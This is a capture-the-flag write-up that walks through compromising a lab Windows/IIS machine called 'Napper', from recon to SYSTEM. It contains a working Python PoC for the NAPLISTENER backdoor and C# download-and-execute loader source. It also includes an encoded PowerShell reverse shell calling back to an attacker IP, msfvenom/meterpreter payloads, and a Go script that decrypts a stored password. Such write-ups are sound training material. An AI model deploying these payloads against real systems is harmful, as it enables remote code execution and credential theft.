we start with a classical nmap to scan all ports:

```bash
nmap -sC -sV -p- 10.10.11.240

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_http-title: Research Blog | Home 
|_http-generator: Hugo 0.112.3
|_ssl-date: 2023-11-14T18:51:41+00:00; +6s from scanner time.
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
we can see there is a 443 port with a subject called _app.napper.htb_ so we add it to /etc/hosts

```bash
sudo nano /etc/hosts

10.10.11.240  napper.htb app.napper.htb
```
in order to complete the enumeration I start a subdomain scanning wit wfuzz:

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://napper.htb/ -H "Host:FUZZ.napper.htb" --hl 186

000000387:   401        29 L     100 W      1293 Ch     "internal" 
```

there is another subdomain to add it.
It's time to visit the webserver at the following URL _https://app.napper.htb/_, we can see a few posts about: Sleeperbot, reverse engineering, .NET and use of powershell to setup SSL.
The most interesting post is called _Enabling Basic Authentication on IIS Using PowerShell: A Step-by-Step Guide_ for two main reasons: the first one talk about an IIS (like our target machine) and the second one about a login credentials __("-Name:example|-String:ExamplePassword")__ very probably relating to the URL _internal.napper.htb_ that it has a login form.
We can insert the previous credentials and gain access, there is a new posts that it talks about a _NAPLISTENER_ exploit that it allows to run a .exe by a remote request (at this path /ews/MsExgHealthCheckd/), if we continue to read at the following URL _https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph_ we can retrieve a Poc written in python (This one it has a little changes):

```python
import requests
import subprocess
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
payload = "<base64 of .exe>"
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"
subprocess.Popen(["python3","-m","http.server","80"], stdin=subprocess.DEVNULL)

url_ssl = f"https://napper.htb/ews/MsExgHealthCheckd/"

r_ssl = requests.post(url_ssl, data=form_field, verify=False)
print(f"{url_ssl}: {r_ssl.status_code} {r_ssl.headers}")
```

Inside the _payload_ variable we insert the base64 of a .exe and the executable itself contains a link to a revshell written in powershell:

_Code of the .exe:_
```c#
using System;
using System.Diagnostics;
using System.Net;

namespace mal
{
    public class Run
    {
        public Run()
        {
            var scriptUrl = "http://10.10.16.98/<revshell>.ps1";

            using (WebClient webClient = new WebClient())
            {
                string scriptContent = webClient.DownloadString(scriptUrl);

                var processStartInfo = new ProcessStartInfo("powershell.exe")
                {
                    Arguments = scriptContent,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var process = new Process
                {
                    StartInfo = processStartInfo
                };

                process.Start();
            }
        }

        public static void Main(string[] args)
        {

        }
    }
}
```
```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOQA4ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
#revshell in base64 with ip 10.10.16.98 and port 5555
```
```bash
mcs mal.cs -out:mal.exe #comand to compile the executable in c#
```
```bash
base64 <file>.exe -w0 #comand to generate the base64
```
```bash
nc -lnvp 5555 #comand to open a listener
```

We paste the base64 inside the poc and we start it. We receive the revshell, we're inside with the ruben user before to retrieve the user flag we upload meterpreter:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.98 LPORT=7777 -f exe 

msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.98; set lport 7777; exploit"
#comand to create a listener
```
```powershell
curl 10.10.16.98/reverse.exe -o reverse.exe
.\reverse.exe
```
Now we're able to take the flag and carry on with the privesc.
It takes some time to search all around but we can see two interesting things: a _9200  (elastic port)_ and some files at the following path _C:\temp\www\internal\content\posts_ we read inside the _no-more-laps.md_ that the team want to store the backup's password  within the elastic DB, further research deep down in the _internal-laps-alpha_, we can found _a.exe (elastic executable)_ and .env (generic credentials for elastic db); this point I browse at the following URL _https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch/_
to understand about elastic and this one it was very helpful _http://10.10.11.240:9200/_search?pretty=true_, it combines with curl and the previous credentials:
```bash
curl -X GET http://10.10.11.240:9200/_search?pretty=true -u user:DumpPasswordHere
```

output:
```json
{
    "took": 4,
    "timed_out": false,
    "_shards": {
        "total": 2,
        "successful": 2,
        "skipped": 0,
        "failed": 0
    },
    "hits": {
        "total": {
            "value": 2,
            "relation": "eq"
        },
        "max_score": 1.0,
        "hits": [{
            "_index": "seed",
            "_id": "1",
            "_score": 1.0,
            "_source": {
                "seed": 83462631
            }
        }, {
            "_index": "user-00001",
            "_id": "f2rSyIsB6rvkIB4hKRaT",
            "_score": 1.0,
            "_source": {
                "blob": "4vYWh3y-t0qmWq1F_GzLZG6UKjXMHKNSk-9veeFgsRdePEAGDgqU_zQRsICeiFkBa2BHFP1TE_Q=",
                "timestamp": "2023-11-13T05:14:58.3043971-08:00"
            }
        }]
    }
}
```
the blob it's the password for the user but is encrypted, the last chance is to use ghidra against the _a.exe_ and understand how the key is generated.
The seed is the same that used to generate the key, a loop long 16 byes is used to generate the key, at this point a chinese guy helped with the go script in order to retrieve the ket
```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
)

func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func genKey(seed int) (key []byte) {
	rand.Seed(int64(seed))
	for i := 0; i < 0x10; i++ {
		val := rand.Intn(0xfe)
		key = append(key, byte(val+1))
	}
	return
}

func decrypt(seed int, enc []byte) (data []byte) {
	fmt.Printf("Seed: %v\n", seed)
	key := genKey(seed)
	fmt.Printf("Key: %v\n", key)
	iv := enc[:aes.BlockSize]
	fmt.Printf("IV: %v\n", iv)
	data = enc[aes.BlockSize:]
	
	block, err := aes.NewCipher(key)
	checkErr(err)
	
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(data, data)
	fmt.Printf("Plaintext: %s\n", data)
	return
}

func main() {
	if len(os.Args) != 3 {
		return
	}
	seed, err := strconv.Atoi(os.Args[1])
	checkErr(err)
	enc, err := base64.URLEncoding.DecodeString(os.Args[2])
	checkErr(err)
	
	decrypt(seed, enc)
}
```
after run it we can retrieve the backup's password and we can logon inside it:
```cmd
.\runascs.exe backup <password> "cmd.exe -c .\reverse.exe" 
```
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.98; set lport 7777; exploit"
#comand to create a listener, meterpreter allows to use the same port
```
the previous command trigger a revshell (uploaded in the target machine), we're backup user, now we can achieve the system user with the meterpreter command and finally gain the root flag
```bash
getsystem #comand to become system
type C:\\Users\\Administrator\\Desktop\\root.txt #meterpreter command to read the root flag
```
